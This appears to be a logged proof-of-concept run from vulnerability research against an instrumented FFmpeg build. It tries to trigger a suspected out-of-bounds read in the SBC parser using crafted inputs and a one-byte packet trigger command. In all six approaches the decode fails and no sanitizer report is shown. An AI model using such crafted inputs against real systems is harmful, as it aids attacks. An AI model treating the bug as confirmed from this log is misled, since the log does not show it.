@@ -1,0 +1,408 @@
+=== SBC parser OOB read PoC ===
+Binary: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
+Date:   Tue Sep  8 09:55:12 PM +08 2026
+
+[*] Generating crafted SBC input files...
+[+] Created /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_sbc_parser_c/vuln_001_input.sbc (8 bytes): 9c00000000000000
+[+] Created /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_sbc_parser_c/vuln_001_input2.sbc (2 bytes)
+[+] Created /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_sbc_parser_c/vuln_001_input3.sbc (4 bytes, MSBC syncword)
+[+] Created /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_sbc_parser_c/vuln_001_input4.sbc (5 bytes)
+
+[*] All input files created.
+[*] Trigger requires: ffmpeg -f sbc -raw_packet_size 1 -i <file>
+[*] This ensures the parser receives exactly 1 byte per call,
+[*] causing the header-completion memcpy to read 2 bytes from a 1-byte buffer.
+
+=== Approach 1: primary input (8 bytes), raw_packet_size=1 ===
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 11 (Ubuntu 11.4.0-1ubuntu1~22.04.2)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[aist#0:0/sbc @ 0x514000000240] Guessed Channel Layout: mono
+Input #0, sbc, from 'vuln_001_input.sbc':
+  Duration: N/A, start: 0.000000, bitrate: N/A
+  Stream #0:0: Audio: sbc, 16000 Hz, mono, s16p
+[out#0/null @ 0x511000000a40] No explicit maps, mapping streams automatically...
+[aost#0:0/pcm_s16le @ 0x517000000780] Created audio stream from input stream 0:0
+Stream mapping:
+  Stream #0:0 -> #0:0 (sbc (native) -> pcm_s16le (native))
+[aost#0:0/pcm_s16le @ 0x517000000780] Starting thread...
+[af#0:0 @ 0x51a000000080] Starting thread...
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Starting thread...
+[in#0/sbc @ 0x513000000200] Starting thread...
+Press [q] to stop, [?] for help
+[in#0/sbc @ 0x513000000200] EOF while reading input
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Error submitting packet to decoder: No such process
+[in#0/sbc @ 0x513000000200] Terminating thread with success
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decoder thread received EOF packet
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decoder returned EOF, finishing
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decode error rate 1 exceeds maximum 0.666667
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Task finished with error: Error number -1145393733 occurred
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Terminating thread with error: Error number -1145393733 occurred
+[graph_-1_in_0:0 @ 0x511000010300] tb:1/90000 samplefmt:s16p samplerate:16000 chlayout:mono
+[format_out_#0:0 @ 0x511000010800] auto-inserting filter 'auto_aresample_0' between the filter 'Parsed_anull_0' and the filter 'format_out_#0:0'
+[auto_aresample_0 @ 0x511000010940] ch:1 chl:mono fmt:s16p r:16000Hz -> ch:1 chl:mono fmt:s16 r:16000Hz
+[af#0:0 @ 0x516000000080] No filtered frames for output stream, trying to initialize anyway.
+Output #0, null, to 'pipe:':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0: Audio: pcm_s16le, 16000 Hz, mono, s16, 256 kb/s
+    Metadata:
+      encoder         : Lavc63.11.100 pcm_s16le
+[out#0/null @ 0x511000000a40] Starting thread...
+[af#0:0 @ 0x51a000000080] Filtergraph returned EOF, finishing
+[af#0:0 @ 0x51a000000080] All consumers returned EOF
+[aost#0:0/pcm_s16le @ 0x517000000780] [enc:pcm_s16le @ 0x511000000f40] Encoder thread received EOF
+[aost#0:0/pcm_s16le @ 0x517000000780] Terminating thread with success
+[out#0/null @ 0x511000000a40] All streams finished
+[out#0/null @ 0x511000000a40] Terminating thread with success
+[af#0:0 @ 0x51a000000080] Terminating thread with success
+[out#0/null @ 0x511000000a40] Output file #0 (pipe:):
+[out#0/null @ 0x511000000a40]   Output stream #0:0 (audio): 0 frames encoded (0 samples); 0 packets muxed (0 bytes); 
+[out#0/null @ 0x511000000a40]   Total: 0 packets (0 bytes) muxed
+[out#0/null @ 0x511000000a40] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+[out#0/null @ 0x511000000a40] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=N/A time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.01    
+[in#0/sbc @ 0x513000000200] Input file #0 (vuln_001_input.sbc):
+[in#0/sbc @ 0x513000000200]   Input stream #0:0 (audio): 1 packets read (7 bytes); 0 frames decoded; 1 decode errors (0 samples); 
+[in#0/sbc @ 0x513000000200]   Total: 1 packets (7 bytes) demuxed
+[AVIOContext @ 0x513000000580] Statistics: 8 bytes read, 0 seeks
+Conversion failed!
+
+Exiting with exit code 69
+---
+
+=== Approach 2: variant2 (2-byte file), raw_packet_size=1 ===
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 11 (Ubuntu 11.4.0-1ubuntu1~22.04.2)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[aist#0:0/sbc @ 0x514000000240] Guessed Channel Layout: mono
+Input #0, sbc, from 'vuln_001_input2.sbc':
+  Duration: N/A, start: 0.000000, bitrate: N/A
+  Stream #0:0: Audio: sbc, 16000 Hz, mono, s16p
+[out#0/null @ 0x511000000a40] No explicit maps, mapping streams automatically...
+[aost#0:0/pcm_s16le @ 0x517000000780] Created audio stream from input stream 0:0
+Stream mapping:
+  Stream #0:0 -> #0:0 (sbc (native) -> pcm_s16le (native))
+[aost#0:0/pcm_s16le @ 0x517000000780] Starting thread...
+[af#0:0 @ 0x51a000000080] Starting thread...
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Starting thread...
+[in#0/sbc @ 0x513000000200] Starting thread...
+Press [q] to stop, [?] for help
+[in#0/sbc @ 0x513000000200] EOF while reading input
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Error submitting packet to decoder: Operation not permitted
+[in#0/sbc @ 0x513000000200] Terminating thread with success
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decoder thread received EOF packet
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decoder returned EOF, finishing
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decode error rate 1 exceeds maximum 0.666667
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Task finished with error: Error number -1145393733 occurred
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Terminating thread with error: Error number -1145393733 occurred
+[graph_-1_in_0:0 @ 0x511000010300] tb:1/90000 samplefmt:s16p samplerate:16000 chlayout:mono
+[format_out_#0:0 @ 0x511000010800] auto-inserting filter 'auto_aresample_0' between the filter 'Parsed_anull_0' and the filter 'format_out_#0:0'
+[auto_aresample_0 @ 0x511000010940] ch:1 chl:mono fmt:s16p r:16000Hz -> ch:1 chl:mono fmt:s16 r:16000Hz
+[af#0:0 @ 0x516000000080] No filtered frames for output stream, trying to initialize anyway.
+Output #0, null, to 'pipe:':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0: Audio: pcm_s16le, 16000 Hz, mono, s16, 256 kb/s
+    Metadata:
+      encoder         : Lavc63.11.100 pcm_s16le
+[out#0/null @ 0x511000000a40] Starting thread...
+[af#0:0 @ 0x51a000000080] Filtergraph returned EOF, finishing
+[af#0:0 @ 0x51a000000080] All consumers returned EOF
+[aost#0:0/pcm_s16le @ 0x517000000780] [enc:pcm_s16le @ 0x511000000f40] Encoder thread received EOF
+[aost#0:0/pcm_s16le @ 0x517000000780] Terminating thread with success
+[out#0/null @ 0x511000000a40] All streams finished
+[out#0/null @ 0x511000000a40] Terminating thread with success
+[af#0:0 @ 0x51a000000080] Terminating thread with success
+[out#0/null @ 0x511000000a40] Output file #0 (pipe:):
+[out#0/null @ 0x511000000a40]   Output stream #0:0 (audio): 0 frames encoded (0 samples); 0 packets muxed (0 bytes); 
+[out#0/null @ 0x511000000a40]   Total: 0 packets (0 bytes) muxed
+[out#0/null @ 0x511000000a40] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+[out#0/null @ 0x511000000a40] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=N/A time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.00    
+[in#0/sbc @ 0x513000000200] Input file #0 (vuln_001_input2.sbc):
+[in#0/sbc @ 0x513000000200]   Input stream #0:0 (audio): 1 packets read (1 bytes); 0 frames decoded; 1 decode errors (0 samples); 
+[in#0/sbc @ 0x513000000200]   Total: 1 packets (1 bytes) demuxed
+[AVIOContext @ 0x513000000580] Statistics: 2 bytes read, 0 seeks
+Conversion failed!
+
+Exiting with exit code 69
+---
+
+=== Approach 3: MSBC variant, raw_packet_size=1 ===
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 11 (Ubuntu 11.4.0-1ubuntu1~22.04.2)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[aist#0:0/sbc @ 0x514000000240] Guessed Channel Layout: mono
+Input #0, sbc, from 'vuln_001_input3.sbc':
+  Duration: N/A, start: 0.000000, bitrate: N/A
+  Stream #0:0: Audio: sbc, 16000 Hz, mono, s16p
+[out#0/null @ 0x511000000a40] No explicit maps, mapping streams automatically...
+[aost#0:0/pcm_s16le @ 0x517000000780] Created audio stream from input stream 0:0
+Stream mapping:
+  Stream #0:0 -> #0:0 (sbc (native) -> pcm_s16le (native))
+[aost#0:0/pcm_s16le @ 0x517000000780] Starting thread...
+[af#0:0 @ 0x51a000000080] Starting thread...
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Starting thread...
+[in#0/sbc @ 0x513000000200] Starting thread...
+Press [q] to stop, [?] for help
+[in#0/sbc @ 0x513000000200] EOF while reading input
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Error submitting packet to decoder: Operation not permitted
+[in#0/sbc @ 0x513000000200] Terminating thread with success
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decoder thread received EOF packet
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decoder returned EOF, finishing
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decode error rate 1 exceeds maximum 0.666667
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Task finished with error: Error number -1145393733 occurred
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Terminating thread with error: Error number -1145393733 occurred
+[graph_-1_in_0:0 @ 0x511000010300] tb:1/90000 samplefmt:s16p samplerate:16000 chlayout:mono
+[format_out_#0:0 @ 0x511000010800] auto-inserting filter 'auto_aresample_0' between the filter 'Parsed_anull_0' and the filter 'format_out_#0:0'
+[auto_aresample_0 @ 0x511000010940] ch:1 chl:mono fmt:s16p r:16000Hz -> ch:1 chl:mono fmt:s16 r:16000Hz
+[af#0:0 @ 0x516000000080] No filtered frames for output stream, trying to initialize anyway.
+Output #0, null, to 'pipe:':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0: Audio: pcm_s16le, 16000 Hz, mono, s16, 256 kb/s
+    Metadata:
+      encoder         : Lavc63.11.100 pcm_s16le
+[out#0/null @ 0x511000000a40] Starting thread...
+[af#0:0 @ 0x51a000000080] Filtergraph returned EOF, finishing
+[af#0:0 @ 0x51a000000080] All consumers returned EOF
+[aost#0:0/pcm_s16le @ 0x517000000780] [enc:pcm_s16le @ 0x511000000f40] Encoder thread received EOF
+[aost#0:0/pcm_s16le @ 0x517000000780] Terminating thread with success
+[out#0/null @ 0x511000000a40] All streams finished
+[out#0/null @ 0x511000000a40] Terminating thread with success
+[af#0:0 @ 0x51a000000080] Terminating thread with success
+[out#0/null @ 0x511000000a40] Output file #0 (pipe:):
+[out#0/null @ 0x511000000a40]   Output stream #0:0 (audio): 0 frames encoded (0 samples); 0 packets muxed (0 bytes); 
+[out#0/null @ 0x511000000a40]   Total: 0 packets (0 bytes) muxed
+[out#0/null @ 0x511000000a40] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+[out#0/null @ 0x511000000a40] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=N/A time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.00    
+[in#0/sbc @ 0x513000000200] Input file #0 (vuln_001_input3.sbc):
+[in#0/sbc @ 0x513000000200]   Input stream #0:0 (audio): 1 packets read (3 bytes); 0 frames decoded; 1 decode errors (0 samples); 
+[in#0/sbc @ 0x513000000200]   Total: 1 packets (3 bytes) demuxed
+[AVIOContext @ 0x513000000580] Statistics: 4 bytes read, 0 seeks
+Conversion failed!
+
+Exiting with exit code 69
+---
+
+=== Approach 4: named pipe, 1 byte at a time ===
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 11 (Ubuntu 11.4.0-1ubuntu1~22.04.2)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[aist#0:0/sbc @ 0x514000000240] Guessed Channel Layout: mono
+Input #0, sbc, from '/tmp/sbc_poc_pipe_3976986':
+  Duration: N/A, start: 0.000000, bitrate: N/A
+  Stream #0:0: Audio: sbc, 16000 Hz, mono, s16p
+[out#0/null @ 0x511000000a40] No explicit maps, mapping streams automatically...
+[aost#0:0/pcm_s16le @ 0x517000000780] Created audio stream from input stream 0:0
+Stream mapping:
+  Stream #0:0 -> #0:0 (sbc (native) -> pcm_s16le (native))
+[aost#0:0/pcm_s16le @ 0x517000000780] Starting thread...
+[af#0:0 @ 0x51a000000080] Starting thread...
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Starting thread...
+[in#0/sbc @ 0x513000000200] Starting thread...
+Press [q] to stop, [?] for help
+[in#0/sbc @ 0x513000000200] EOF while reading input
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Error submitting packet to decoder: Operation not permitted
+[in#0/sbc @ 0x513000000200] Terminating thread with success
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decoder thread received EOF packet
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decoder returned EOF, finishing
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decode error rate 1 exceeds maximum 0.666667
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Task finished with error: Error number -1145393733 occurred
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Terminating thread with error: Error number -1145393733 occurred
+[graph_-1_in_0:0 @ 0x511000010300] tb:1/90000 samplefmt:s16p samplerate:16000 chlayout:mono
+[format_out_#0:0 @ 0x511000010800] auto-inserting filter 'auto_aresample_0' between the filter 'Parsed_anull_0' and the filter 'format_out_#0:0'
+[auto_aresample_0 @ 0x511000010940] ch:1 chl:mono fmt:s16p r:16000Hz -> ch:1 chl:mono fmt:s16 r:16000Hz
+[af#0:0 @ 0x516000000080] No filtered frames for output stream, trying to initialize anyway.
+Output #0, null, to 'pipe:':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0: Audio: pcm_s16le, 16000 Hz, mono, s16, 256 kb/s
+    Metadata:
+      encoder         : Lavc63.11.100 pcm_s16le
+[out#0/null @ 0x511000000a40] Starting thread...
+[af#0:0 @ 0x51a000000080] Filtergraph returned EOF, finishing
+[af#0:0 @ 0x51a000000080] All consumers returned EOF
+[aost#0:0/pcm_s16le @ 0x517000000780] [enc:pcm_s16le @ 0x511000000f40] Encoder thread received EOF
+[aost#0:0/pcm_s16le @ 0x517000000780] Terminating thread with success
+[out#0/null @ 0x511000000a40] All streams finished
+[out#0/null @ 0x511000000a40] Terminating thread with success
+[af#0:0 @ 0x51a000000080] Terminating thread with success
+[out#0/null @ 0x511000000a40] Output file #0 (pipe:):
+[out#0/null @ 0x511000000a40]   Output stream #0:0 (audio): 0 frames encoded (0 samples); 0 packets muxed (0 bytes); 
+[out#0/null @ 0x511000000a40]   Total: 0 packets (0 bytes) muxed
+[out#0/null @ 0x511000000a40] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+[out#0/null @ 0x511000000a40] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=N/A time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.00    
+[in#0/sbc @ 0x513000000200] Input file #0 (/tmp/sbc_poc_pipe_3976986):
+[in#0/sbc @ 0x513000000200]   Input stream #0:0 (audio): 1 packets read (1 bytes); 0 frames decoded; 1 decode errors (0 samples); 
+[in#0/sbc @ 0x513000000200]   Total: 1 packets (1 bytes) demuxed
+[AVIOContext @ 0x513000000580] Statistics: 2 bytes read, 0 seeks
+Conversion failed!
+
+Exiting with exit code 69
+---
+
+=== Approach 5: larger file (longer stream), raw_packet_size=1 ===
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 11 (Ubuntu 11.4.0-1ubuntu1~22.04.2)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[aist#0:0/sbc @ 0x514000000240] Guessed Channel Layout: mono
+Input #0, sbc, from 'vuln_001_input4.sbc':
+  Duration: N/A, start: 0.000000, bitrate: N/A
+  Stream #0:0: Audio: sbc, 16000 Hz, mono, s16p
+[out#0/null @ 0x511000000a40] No explicit maps, mapping streams automatically...
+[aost#0:0/pcm_s16le @ 0x517000000780] Created audio stream from input stream 0:0
+Stream mapping:
+  Stream #0:0 -> #0:0 (sbc (native) -> pcm_s16le (native))
+[aost#0:0/pcm_s16le @ 0x517000000780] Starting thread...
+[af#0:0 @ 0x51a000000080] Starting thread...
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Starting thread...
+[in#0/sbc @ 0x513000000200] Starting thread...
+Press [q] to stop, [?] for help
+[in#0/sbc @ 0x513000000200] EOF while reading input
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Error submitting packet to decoder: Operation not permitted
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decoder thread received EOF packet
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decoder returned EOF, finishing
+[in#0/sbc @ 0x513000000200] Terminating thread with success
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decode error rate 1 exceeds maximum 0.666667
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Task finished with error: Error number -1145393733 occurred
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Terminating thread with error: Error number -1145393733 occurred
+[graph_-1_in_0:0 @ 0x511000010300] tb:1/90000 samplefmt:s16p samplerate:16000 chlayout:mono
+[format_out_#0:0 @ 0x511000010800] auto-inserting filter 'auto_aresample_0' between the filter 'Parsed_anull_0' and the filter 'format_out_#0:0'
+[auto_aresample_0 @ 0x511000010940] ch:1 chl:mono fmt:s16p r:16000Hz -> ch:1 chl:mono fmt:s16 r:16000Hz
+[af#0:0 @ 0x516000000080] No filtered frames for output stream, trying to initialize anyway.
+Output #0, null, to 'pipe:':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0: Audio: pcm_s16le, 16000 Hz, mono, s16, 256 kb/s
+    Metadata:
+      encoder         : Lavc63.11.100 pcm_s16le
+[out#0/null @ 0x511000000a40] Starting thread...
+[af#0:0 @ 0x51a000000080] Filtergraph returned EOF, finishing
+[af#0:0 @ 0x51a000000080] All consumers returned EOF
+[aost#0:0/pcm_s16le @ 0x517000000780] [enc:pcm_s16le @ 0x511000000f40] Encoder thread received EOF
+[aost#0:0/pcm_s16le @ 0x517000000780] Terminating thread with success
+[out#0/null @ 0x511000000a40] All streams finished
+[out#0/null @ 0x511000000a40] Terminating thread with success
+[af#0:0 @ 0x51a000000080] Terminating thread with success
+[out#0/null @ 0x511000000a40] Output file #0 (pipe:):
+[out#0/null @ 0x511000000a40]   Output stream #0:0 (audio): 0 frames encoded (0 samples); 0 packets muxed (0 bytes); 
+[out#0/null @ 0x511000000a40]   Total: 0 packets (0 bytes) muxed
+[out#0/null @ 0x511000000a40] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+[out#0/null @ 0x511000000a40] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=N/A time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.00    
+[in#0/sbc @ 0x513000000200] Input file #0 (vuln_001_input4.sbc):
+[in#0/sbc @ 0x513000000200]   Input stream #0:0 (audio): 1 packets read (4 bytes); 0 frames decoded; 1 decode errors (0 samples); 
+[in#0/sbc @ 0x513000000200]   Total: 1 packets (4 bytes) demuxed
+[AVIOContext @ 0x513000000580] Statistics: 5 bytes read, 0 seeks
+Conversion failed!
+
+Exiting with exit code 69
+---
+
+=== Approach 6: pipe via dd (1 byte at a time through stdin) ===
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 11 (Ubuntu 11.4.0-1ubuntu1~22.04.2)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[aist#0:0/sbc @ 0x514000000240] Guessed Channel Layout: mono
+Input #0, sbc, from 'pipe:':
+  Duration: N/A, start: 0.000000, bitrate: N/A
+  Stream #0:0: Audio: sbc, 16000 Hz, mono, s16p
+[out#0/null @ 0x511000000900] No explicit maps, mapping streams automatically...
+[aost#0:0/pcm_s16le @ 0x517000000780] Created audio stream from input stream 0:0
+Stream mapping:
+  Stream #0:0 -> #0:0 (sbc (native) -> pcm_s16le (native))
+[aost#0:0/pcm_s16le @ 0x517000000780] Starting thread...
+[af#0:0 @ 0x51a000000080] Starting thread...
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Starting thread...
+[in#0/sbc @ 0x513000000200] Starting thread...
+[in#0/sbc @ 0x513000000200] EOF while reading input
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Error submitting packet to decoder: No such process
+[in#0/sbc @ 0x513000000200] Terminating thread with success
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decoder thread received EOF packet
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decoder returned EOF, finishing
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Decode error rate 1 exceeds maximum 0.666667
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Task finished with error: Error number -1145393733 occurred
+[aist#0:0/sbc @ 0x514000000240] [dec:sbc @ 0x513000000c80] Terminating thread with error: Error number -1145393733 occurred
+[graph_-1_in_0:0 @ 0x511000010300] tb:1/90000 samplefmt:s16p samplerate:16000 chlayout:mono
+[format_out_#0:0 @ 0x511000010800] auto-inserting filter 'auto_aresample_0' between the filter 'Parsed_anull_0' and the filter 'format_out_#0:0'
+[auto_aresample_0 @ 0x511000010940] ch:1 chl:mono fmt:s16p r:16000Hz -> ch:1 chl:mono fmt:s16 r:16000Hz
+[af#0:0 @ 0x516000000080] No filtered frames for output stream, trying to initialize anyway.
+Output #0, null, to 'pipe:':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0: Audio: pcm_s16le, 16000 Hz, mono, s16, 256 kb/s
+    Metadata:
+      encoder         : Lavc63.11.100 pcm_s16le
+[out#0/null @ 0x511000000900] Starting thread...
+[af#0:0 @ 0x51a000000080] Filtergraph returned EOF, finishing
+[af#0:0 @ 0x51a000000080] All consumers returned EOF
+[aost#0:0/pcm_s16le @ 0x517000000780] [enc:pcm_s16le @ 0x511000000e00] Encoder thread received EOF
+[aost#0:0/pcm_s16le @ 0x517000000780] Terminating thread with success
+[out#0/null @ 0x511000000900] All streams finished
+[out#0/null @ 0x511000000900] Terminating thread with success
+[af#0:0 @ 0x51a000000080] Terminating thread with success
+[out#0/null @ 0x511000000900] Output file #0 (pipe:):
+[out#0/null @ 0x511000000900]   Output stream #0:0 (audio): 0 frames encoded (0 samples); 0 packets muxed (0 bytes); 
+[out#0/null @ 0x511000000900]   Total: 0 packets (0 bytes) muxed
+[out#0/null @ 0x511000000900] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+[out#0/null @ 0x511000000900] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=N/A time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.00    
+[in#0/sbc @ 0x513000000200] Input file #0 (pipe:):
+[in#0/sbc @ 0x513000000200]   Input stream #0:0 (audio): 1 packets read (7 bytes); 0 frames decoded; 1 decode errors (0 samples); 
+[in#0/sbc @ 0x513000000200]   Total: 1 packets (7 bytes) demuxed
+[AVIOContext @ 0x513000000580] Statistics: 8 bytes read, 0 seeks
+Conversion failed!
+
+Exiting with exit code 69
+---
+
+=== Checking all ASAN logs ===
+
+=== PoC run complete ===
+EXIT=0
